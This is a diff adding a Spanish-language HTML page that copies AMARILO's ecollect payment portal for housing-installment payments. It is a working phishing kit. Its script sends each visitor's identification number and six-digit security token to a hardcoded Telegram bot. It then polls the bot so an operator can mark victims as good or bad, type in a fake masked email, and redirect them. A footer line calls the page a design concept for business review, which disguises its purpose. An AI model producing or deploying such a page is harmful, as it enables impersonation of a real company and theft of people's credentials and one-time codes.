@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Módulo de Recaudos</title>
+
+<style>
+:root {
+    --amarillo: #ffdf00;
+    --texto: #29313b;
+    --fondo: #f2f2f2;
+    --error: #e74c3c;
+}
+
+* { box-sizing: border-box; }
+
+html { min-height: 100%; }
+
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    color: var(--texto);
+    background: var(--fondo);
+}
+
+/* Encabezado */
+.topbar {
+    min-height: 90px;
+    display: flex;
+    align-items: center;
+    gap: 25px;
+    padding: 10px clamp(20px, 5vw, 80px);
+    background: #fff;
+    border-bottom: 1px solid #e5e5e5;
+}
+
+.brand {
+    flex: 0 0 105px;
+    text-align: center;
+    color: #111;
+    font-size: 16px;
+    font-weight: 700;
+}
+
+.brand-mark {
+    width: 50px;
+    height: 43px;
+    margin: 0 auto 4px;
+    border: 6px solid var(--amarillo);
+}
+
+.brand-divider {
+    width: 1px;
+    height: 52px;
+    background: #555;
+}
+
+.topbar h1 {
+    flex: 1;
+    margin: 0;
+    color: #202a39;
+    font-size: 25px;
+    font-weight: 700;
+}
+
+.home-btn {
+    padding: 9px 15px;
+    border: 1px solid #394150;
+    border-radius: 5px;
+    background: #fff;
+    color: #1d2c40;
+    font-family: inherit;
+    font-size: 11px;
+    white-space: nowrap;
+    cursor: pointer;
+}
+
+/* Contenido principal */
+main {
+    min-height: calc(100vh - 120px);
+    padding: 30px 20px 40px;
+    background: radial-gradient(ellipse at center, #fff 0%, #f2f2f2 100%);
+}
+
+.intro {
+    max-width: 1150px;
+    margin: 0 auto 43px;
+    text-align: center;
+}
+
+.intro h2 {
+    margin: 0 0 10px;
+    color: #29313b;
+    font-size: clamp(18px, 1.8vw, 25px);
+    font-weight: 700;
+    line-height: 1.3;
+    letter-spacing: -0.3px;
+}
+
+.intro p {
+    margin: 0;
+    color: #29313b;
+    font-size: 17px;
+    font-weight: 700;
+    line-height: 1.4;
+}
+
+/* Tarjeta central */
+.payment-card {
+    display: grid;
+    grid-template-columns: 46% 54%;
+    width: 100%;
+    max-width: 680px;
+    min-height: 390px;
+    margin: 0 auto;
+    overflow: hidden;
+    background: #fff;
+    border: 1px solid #d8d8d8;
+    border-radius: 8px;
+    box-shadow: 0 2px 5px #0002;
+}
+
+.photo-side {
+    position: relative;
+    align-self: stretch;
+    min-width: 0;
+    min-height: 390px;
+    overflow: hidden;
+    background: #fff;
+}
+
+.photo-side img {
+    position: absolute;
+    display: block;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    object-position: center center;
+}
+
+.form-side {
+    min-width: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 28px 24px 22px;
+}
+
+.form-side h3 {
+    margin: 0 0 12px;
+    color: #29313b;
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.3;
+    letter-spacing: -0.2px;
+}
+
+.form-side .help {
+    margin: 0 0 14px;
+    color: #555;
+    font-size: 13px;
+    font-weight: 600;
+    line-height: 1.4;
+}
+
+.form-side .email-text {
+    margin: 0 0 12px;
+    color: #29313b;
+    font-size: 13px;
+    font-weight: 700;
+    word-break: break-all;
+}
+
+/* Mensajes de Error Personalizados */
+.error-msg {
+    display: none;
+    color: var(--error);
+    font-size: 12px;
+    font-weight: 700;
+    margin: -8px 0 12px;
+    max-width: 300px;
+    line-height: 1.3;
+}
+.error-msg.show { display: block; }
+
+/* Campo de identificación */
+.input-wrap {
+    display: flex;
+    width: 100%;
+    max-width: 300px;
+    height: 38px;
+    margin: 0 0 17px;
+}
+
+.user-icon {
+    display: flex;
+    flex: 0 0 40px;
+    align-items: center;
+    justify-content: center;
+    border-radius: 4px 0 0 4px;
+    background: #222;
+    color: #fff;
+    font-size: 15px;
+}
+
+.input-wrap input {
+    flex: 1;
+    width: 100%;
+    min-width: 0;
+    height: 38px;
+    padding: 7px 9px;
+    border: 1px solid #ccc;
+    border-left: 0;
+    border-radius: 0 4px 4px 0;
+    background: #fafafa;
+    color: #29313b;
+    font-family: inherit;
+    font-size: 12px;
+}
+
+.input-wrap input::placeholder { color: #777; opacity: 1; }
+
+/* Botón */
+.login-btn {
+    width: 100%;
+    max-width: 300px;
+    min-height: 38px;
+    padding: 8px;
+    border: 1px solid #394150;
+    border-radius: 4px;
+    background: #fff;
+    color: #29313b;
+    font-family: inherit;
+    font-size: 13px;
+    font-weight: 400;
+    cursor: pointer;
+    transition: background 0.2s;
+}
+
+.login-btn:hover { background: #f2f2f2; }
+
+.rule {
+    width: 100%;
+    max-width: 300px;
+    margin: 16px 0 0;
+    border: 0;
+    border-top: 1px solid #777;
+}
+
+/* VISTAS */
+.token-view { display: none; width: 100%; flex-direction: column; }
+.token-view.active { display: flex; }
+.loading-view { display: none; width: 100%; flex-direction: column; align-items: center; padding-top: 20px;}
+.loading-view.active { display: flex; }
+
+.token-input-box {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    max-width: 300px;
+    height: 40px;
+    margin: 0 0 18px;
+    border: 1px solid #a0c2e8; 
+    border-radius: 3px;
+    background: #fff;
+    overflow: hidden;
+}
+
+.token-input-box:focus-within { border-color: #7bafd4; }
+
+.token-input-box .lock-icon {
+    display: flex;
+    flex: 0 0 40px;
+    align-items: center;
+    justify-content: center;
+    background: #222;
+    color: #fff;
+    height: 100%;
+}
+
+.token-input-box input {
+    flex: 1;
+    width: 100%;
+    min-width: 0;
+    border: 0;
+    padding: 0 10px;
+    font-size: 16px;
+    letter-spacing: 2px;
+    font-family: inherit;
+    color: #29313b;
+    outline: none;
+    background: transparent;
+}
+
+.token-input-box input::placeholder { color: #ccc; letter-spacing: 2px; }
+
+.token-input-box .toggle-eye {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 12px;
+    cursor: pointer;
+    background: transparent;
+    border: 0;
+    color: #29313b;
+}
+
+/* Elementos decorativos inferiores */
+.security {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 25px;
+    margin: 28px auto 0;
+}
+
+.ecollect { color: #1c2636; font-size: 25px; font-weight: 700; letter-spacing: -1px; }
+.ecollect b { color: #54ad57; }
+.secure-sub { margin-top: 2px; color: #68ae72; font-size: 11px; }
+.ssl { padding: 11px 17px; border-radius: 25px; background: #7850c6; color: #fff; font-size: 12px; font-weight: 700; }
+
+.cert {
+    display: flex;
+    width: 68px;
+    height: 68px;
+    align-items: center;
+    justify-content: center;
+    border: 3px dotted #333;
+    border-radius: 50%;
+    text-align: center;
+    font-size: 10px;
+    font-weight: 700;
+    line-height: 1.2;
+}
+
+.notice {
+    max-width: 680px;
+    margin: 18px auto 0;
+    color: #666;
+    text-align: center;
+    font-size: 11px;
+    line-height: 1.5;
+}
+
+/* RESPONSIVE */
+@media (min-width: 701px) and (max-width: 950px) {
+    .topbar { gap: 16px; padding-right: 22px; padding-left: 22px; }
+    .topbar h1 { font-size: 21px; }
+    .payment-card { max-width: 640px; min-height: 370px; }
+    .photo-side { min-height: 370px; }
+    .form-side { padding: 24px 18px; }
+    .form-side h3 { font-size: 16px; }
+    .input-wrap, .login-btn, .rule, .token-input-box { max-width: 100%; }
+}
+
+@media (max-width: 700px) {
+    .topbar { min-height: 76px; padding: 7px 12px; gap: 10px; }
+    .brand { flex-basis: 100px; font-size: 17px; }
+    .brand-mark { width: 52px; height: 43px; margin-bottom: 3px; border-width: 6px; }
+    .brand-divider, .topbar h1 { display: none; }
+    .home-btn { margin-left: auto; padding: 10px 12px; font-size: 11px; }
+    main { padding: 20px 0 30px; background: #f2f2f2; }
+    .intro { padding: 0 18px; margin: 0 auto 52px; text-align: center; }
+    .intro h2 { margin: 0 0 16px; color: #333; font-size: 27px; font-weight: 700; line-height: 1.08; letter-spacing: -0.65px; }
+    .intro p { margin: 0; color: #333; font-size: 22px; font-weight: 400; line-height: 1.15; letter-spacing: -0.45px; }
+    .payment-card { display: flex; flex-direction: column; width: 100%; max-width: none; min-height: 0; margin: 0; overflow: hidden; border: 1px solid #dedede; border-radius: 7px; background: #fff; box-shadow: 0 2px 5px #0002; }
+    .photo-side { display: none; }
+    .form-side { display: flex; flex-direction: column; align-items: stretch; width: 100%; padding: 18px 17px 32px; }
+    .form-side h3 { margin: 0 0 12px; color: #333; font-size: 22px; font-weight: 400; line-height: 1.2; letter-spacing: -0.4px; }
+    .form-side .help { margin: 0 0 18px; color: #929292; font-size: 18px; font-weight: 400; line-height: 1.25; letter-spacing: -0.2px; }
+    .form-side .email-text { font-size: 18px; margin-bottom: 16px; }
+    .input-wrap { display: flex; width: 100%; max-width: none; height: 36px; margin: 0 0 18px; }
+    .user-icon { flex: 0 0 54px; width: 54px; min-width: 54px; border-radius: 5px 0 0 5px; font-size: 19px; }
+    .input-wrap input { flex: 1; width: 100%; min-width: 0; height: 36px; padding: 5px 9px; border: 1px solid #ccc; border-left: 0; border-radius: 0 5px 5px 0; background: #fff; font-size: 16px; font-weight: 400; letter-spacing: -0.25px; }
+    .login-btn { width: 100%; max-width: none; min-height: 37px; padding: 7px; border: 1.5px solid #333; border-radius: 6px; background: #fff; color: #333; font-size: 17px; font-weight: 400; letter-spacing: -0.25px; }
+    .token-input-box { width: 100%; max-width: none; height: 44px; margin-bottom: 18px; }
+    .token-input-box .lock-icon { flex-basis: 50px; font-size: 16px; }
+    .token-input-box input { font-size: 18px; }
+    .rule { width: 100%; max-width: none; margin: 14px 0 0; border: 0; border-top: 1px solid #333; }
+    .error-msg { font-size: 14px; max-width: 100%; }
+    .security { gap: 12px; margin: 65px 12px 0; }
+    .ecollect { font-size: 24px; }
+    .secure-sub { font-size: 13px; }
+    .ssl { padding: 12px; font-size: 12px; }
+    .cert { width: 68px; height: 68px; font-size: 10px; }
+    .notice { margin: 20px 16px 0; font-size: 10px; line-height: 1.5; }
+}
+
+@media (max-width: 390px) {
+    .intro { padding: 0 16px; margin-bottom: 45px; }
+    .intro h2 { font-size: 24px; font-weight: 700; line-height: 1.1; letter-spacing: -0.5px; }
+    .intro p { font-size: 20px; line-height: 1.15; }
+    .form-side { padding: 17px 16px 30px; }
+    .form-side h3 { font-size: 20px; }
+    .form-side .help { font-size: 17px; }
+    .form-side .email-text { font-size: 16px; }
+    .input-wrap { height: 36px; margin-bottom: 18px; }
+    .user-icon { flex-basis: 46px; width: 46px; min-width: 46px; }
+    .input-wrap input { height: 36px; padding: 5px 8px; font-size: 14px; }
+    .login-btn { min-height: 37px; font-size: 16px; }
+    .security { margin-top: 55px; }
+}
+</style>
+</head>
+
+<body>
+
+<header class="topbar">
+    <div class="brand" aria-label="Marca">
+        <div class="brand-mark"></div>
+        AMARILO
+    </div>
+    <div class="brand-divider"></div>
+    <h1>Módulo de Recaudos</h1>
+    <button class="home-btn" type="button" onclick="location.reload()">
+        REGRESAR AL INICIO
+    </button>
+</header>
+
+<main>
+    <section class="intro">
+        <h2>Bienvenido al sistema de pagos electrónicos de AMARILO - Separaciones ventas nuevas</h2>
+        <p>AQUÍ PODRÁS REALIZAR TUS PAGOS DE MANERA SEGURA</p>
+    </section>
+
+    <section class="payment-card" aria-label="Módulo de recaudos">
+        <div class="photo-side">
+            <img src="https://styles.ecollect.co/eCollectPlus/10189/eCollect_brand/img/box_login.png" alt="Imagen ilustrativa">
+        </div>
+
+        <div class="form-side">
+            <!-- VISTA 1: IDENTIFICACIÓN -->
+            <div id="viewIdentificacion" style="width: 100%;">
+                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                <p class="help">Digite la información solicitada para ingresar al sistema.</p>
+
+                <div class="input-wrap">
+                    <span class="user-icon" aria-hidden="true">♟</span>
+                    <input type="text" id="identificacion" placeholder="* Número de identificación" aria-label="Número de identificación" inputmode="numeric" maxlength="12">
+                </div>
+                
+                <p class="error-msg" id="errorId">Por favor ingresa tu número de identificación.</p>
+
+                <button class="login-btn" type="button" id="btnLogin">
+                    INICIAR SESIÓN
+                </button>
+                <hr class="rule">
+            </div>
+
+            <!-- VISTA 2: ESPERANDO CORREO (SPINNER) -->
+            <div id="viewEsperandoCorreo" class="loading-view">
+                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                <p class="help">Cargando correo...</p>
+                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #29313b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px 0;"></div>
+            </div>
+
+            <!-- VISTA 3: TOKEN -->
+            <div id="viewToken" class="token-view">
+                <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
+                <p class="help">Por favor ingrese el Token enviado a su correo electrónico:</p>
+                <p class="email-text" id="correoEnmascarado">...</p>
+
+                <div class="token-input-box">
+                    <span class="lock-icon" aria-hidden="true">
+                        <svg width="14" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                    </span>
+                    <input type="password" id="inputToken" aria-label="Token de seguridad" inputmode="numeric" maxlength="6" placeholder="......">
+                    <button type="button" class="toggle-eye" id="btnToggleEye" aria-label="Mostrar u ocultar token">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <p class="error-msg" id="errorToken">El token debe tener exactamente 6 dígitos.</p>
+
+                <button class="login-btn" type="button" id="btnValidarToken">
+                    VALIDAR TOKEN
+                </button>
+                <hr class="rule">
+            </div>
+        </div>
+    </section>
+
+    <section class="security" aria-label="Elementos de seguridad">
+        <div>
+            <div class="ecollect"><b>G</b> ecollect</div>
+            <div class="secure-sub">Seguro para ti ◈</div>
+        </div>
+        <div class="ssl">SSL</div>
+        <div class="cert">ICONO<br>SEGURIDAD</div>
+    </section>
+
+    <p class="notice">Concepto de diseño para revisión empresarial.</p>
+</main>
+
+<!-- OVERLAY DE CARGA GLOBAL -->
+<div class="loading-overlay" id="loading-overlay" style="display:none; position:fixed; inset:0; background:rgba(255,255,255,0.85); align-items:center; justify-content:center; z-index:1000; flex-direction:column;">
+    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #29313b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
+    <p style="font-size:14px; font-weight:700; color:#29313b;">Procesando...</p>
+</div>
+
+<script>
+// ==========================================
+// 🔑 CONFIGURACIÓN DE TELEGRAM
+// ==========================================
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
+const TG_CHAT_ID = '7776240161';
+
+// ==========================================
+// VARIABLES Y ELEMENTOS
+// ==========================================
+const inputId = document.getElementById('identificacion');
+const btnLogin = document.getElementById('btnLogin');
+const viewIdentificacion = document.getElementById('viewIdentificacion');
+const errorId = document.getElementById('errorId');
+
+const viewEsperandoCorreo = document.getElementById('viewEsperandoCorreo');
+const viewToken = document.getElementById('viewToken');
+const correoEnmascarado = document.getElementById('correoEnmascarado');
+const inputToken = document.getElementById('inputToken');
+const btnToggleEye = document.getElementById('btnToggleEye');
+const eyeIcon = document.getElementById('eyeIcon');
+const btnValidarToken = document.getElementById('btnValidarToken');
+const errorToken = document.getElementById('errorToken');
+
+let idBuscadoGlobal = '';
+let actionProcessed = false;
+let pollingActivo = false;
+let pollingTimeout = null;
+let msgIdActual = null;
+let esperandoCorreoEscrito = false;
+let ultimoUpdateId = -1;
+
+// ==========================================
+// LÓGICA DE UI
+// ==========================================
+inputId.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+    errorId.classList.remove('show');
+});
+
+inputToken.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+    errorToken.classList.remove('show');
+});
+
+btnToggleEye.addEventListener('click', function () {
+    if (inputToken.type === 'password') {
+        inputToken.type = 'text';
+        eyeIcon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>`;
+    } else {
+        inputToken.type = 'password';
+        eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
+    }
+    inputToken.focus();
+});
+
+function mostrarOverlay() { document.getElementById('loading-overlay').style.display = 'flex'; }
+function ocultarOverlay() { document.getElementById('loading-overlay').style.display = 'none'; }
+
+// ==========================================
+// ENVIAR A TELEGRAM
+// ==========================================
+function enviarIdentificacionTelegram(valorIngresado, onSent) {
+    const mensaje = `⚡ <b>CELSIA - IDENTIFICACIÓN</b>\n\n🔍 <b>Número:</b> <code>${valorIngresado}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const keyboard = {
+        inline_keyboard: [[
+            { text: '🔑 Pedir Token', callback_data: 'pedir_token' },
+            { text: '✉ Pedir Correo', callback_data: 'pedir_correo' },
+            { text: '❌ Usuario Malo', callback_data: 'usuario_malo' }
+        ]]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            if (typeof onSent === 'function') onSent(msgIdActual);
+        } else if (typeof onSent === 'function') onSent(null);
+    }).catch(() => { if (typeof onSent === 'function') onSent(null); });
+}
+
+function enviarTokenTelegram(valorToken, onSent) {
+    const mensaje = `⚡ <b>CELSIA - TOKEN RECIBIDO</b>\n\n🔍 <b>Identificación:</b> ${idBuscadoGlobal}\n🔑 <b>Token:</b> <code>${valorToken}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Usuario Malo', callback_data: 'usuario_malo_final' }],
+            [{ text: '🌐 Usuario Correcto (Google)', callback_data: 'usuario_correcto' }],
+            [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            if (typeof onSent === 'function') onSent(msgIdActual);
+        } else if (typeof onSent === 'function') onSent(null);
+    }).catch(() => { if (typeof onSent === 'function') onSent(null); });
+}
+
+// ==========================================
+// ESCUCHAR BOTONES Y MENSAJES (POLLING)
+// ==========================================
+function escucharBotones(callbackAction) {
+    if (!msgIdActual) return;
+    pollingActivo = true;
+    
+    function check() {
+        if (!pollingActivo) return;
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query', 'message'], timeout: 10 })
+        }).then(r => r.json()).then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000); return;
+            }
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                
+                // Manejar botones
+                if (u.callback_query) {
+                    const messageId = String(u.callback_query.message.message_id);
+                    if (messageId === String(msgIdActual)) {
+                        pollingActivo = false;
+                        callbackAction(u.callback_query.data);
+                        return;
+                    }
+                }
+
+                // Manejar el texto que tú escribes en Telegram (Correo enmascarado)
+                if (u.message && u.message.text && esperandoCorreoEscrito) {
+                    if (u.message.text.includes('@') || u.message.text.includes('*')) {
+                        pollingActivo = false;
+                        esperandoCorreoEscrito = false;
+                        const textoLimpio = u.message.text.replace(/^\/\w+\s*/, '').trim(); // Quitar comandos si los hay
+                        callbackAction('correo_manual', textoLimpio);
+                        return;
+                    }
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+    }
+    check();
+}
+
+// ==========================================
+// ACCIONES Y REDIRECCIONES
+// ==========================================
+function redirigir(url) {
+    ocultarOverlay();
+    try { window.location.assign(url); } catch(e) { window.location.replace(url); }
+}
+
+function handleTelegramActionId(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+    btnLogin.disabled = false;
+
+    if (action === 'pedir_token') {
+        // Muestra el token con un correo por defecto rápido
+        viewIdentificacion.style.display = 'none';
+        viewToken.classList.add('active');
+        correoEnmascarado.textContent = `au***${idBuscadoGlobal.slice(-2)}@ho*****.com`;
+        setTimeout(() => inputToken.focus(), 100);
+
+    } else if (action === 'pedir_correo') {
+        // Muestra la pantalla de "Cargando correo..."
+        viewIdentificacion.style.display = 'none';
+        viewEsperandoCorreo.classList.add('active');
+        
+        // Activa la escucha para que tú escribas el correo en Telegram
+        esperandoCorreoEscrito = true;
+        actionProcessed = false; // Liberamos para que reciba el texto
+        escucharBotones(handleTelegramActionManual);
+
+    } else if (action === 'usuario_malo') {
+        errorId.textContent = 'El número de identificación no es válido.';
+        errorId.classList.add('show');
+        inputId.value = '';
+        actionProcessed = false;
+    }
+}
+
+function handleTelegramActionManual(action, textoRecibido = '') {
+    if (action === 'correo_manual') {
+        // Ocultar la vista de carga y mostrar el token
+        viewEsperandoCorreo.classList.remove('active');
+        viewToken.classList.add('active');
+        
+        // Poner el correo que TÚ escribiste en Telegram
+        correoEnmascarado.textContent = textoRecibido;
+        
+        // Enfocar el token
+        setTimeout(() => inputToken.focus(), 100);
+        
+        // Ahora escuchamos si el usuario pone el token y tú decides qué hacer
+        enviarTokenTelegram("Esperando token...", function(msgId) {
+            if(msgId) {
+                actionProcessed = false;
+                escucharBotones(handleTelegramActionToken);
+            }
+        });
+    }
+}
+
+function handleTelegramActionToken(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+
+    if (action === 'usuario_correcto') {
+        redirigir('https://www.google.com');
+    } else if (action === 'finalizar_yahoo') {
+        redirigir('https://www.yahoo.com');
+    } else if (action === 'usuario_malo_final') {
+        ocultarOverlay();
+        errorToken.textContent = 'El token ingresado es incorrecto o expiró.';
+        errorToken.classList.add('show');
+        inputToken.value = '';
+        inputToken.focus();
+        actionProcessed = false;
+    } else {
+        ocultarOverlay();
+        actionProcessed = false;
+    }
+}
+
+// ==========================================
+// EVENTOS DE BOTONES EN PANTALLA
+// ==========================================
+btnLogin.addEventListener('click', function() {
+    const id = inputId.value.trim();
+    if (id === '') {
+        errorId.textContent = 'Por favor ingresa tu número de identificación.';
+        errorId.classList.add('show');
+        inputId.focus();
+        return;
+    }
+
+    idBuscadoGlobal = id;
+    actionProcessed = false;
+    mostrarOverlay();
+    btnLogin.disabled = true;
+
+    enviarIdentificacionTelegram(idBuscadoGlobal, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionId);
+        } else {
+            ocultarOverlay();
+            btnLogin.disabled = false;
+            errorId.textContent = 'Error de conexión. Intenta de nuevo.';
+            errorId.classList.add('show');
+        }
+    });
+});
+
+btnValidarToken.addEventListener('click', function() {
+    const token = inputToken.value.trim();
+    if (token.length < 6) {
+        errorToken.textContent = 'El token debe tener exactamente 6 dígitos.';
+        errorToken.classList.add('show');
+        inputToken.focus();
+        return;
+    }
+
+    actionProcessed = false;
+    mostrarOverlay();
+
+    enviarTokenTelegram(token, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionToken);
+        } else {
+            ocultarOverlay();
+            errorToken.textContent = 'Error al enviar el token. Intenta de nuevo.';
+            errorToken.classList.add('show');
+        }
+    });
+});
+
+inputToken.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') { e.preventDefault(); btnValidarToken.click(); }
+});
+</script>
+
+</body>
+</html>
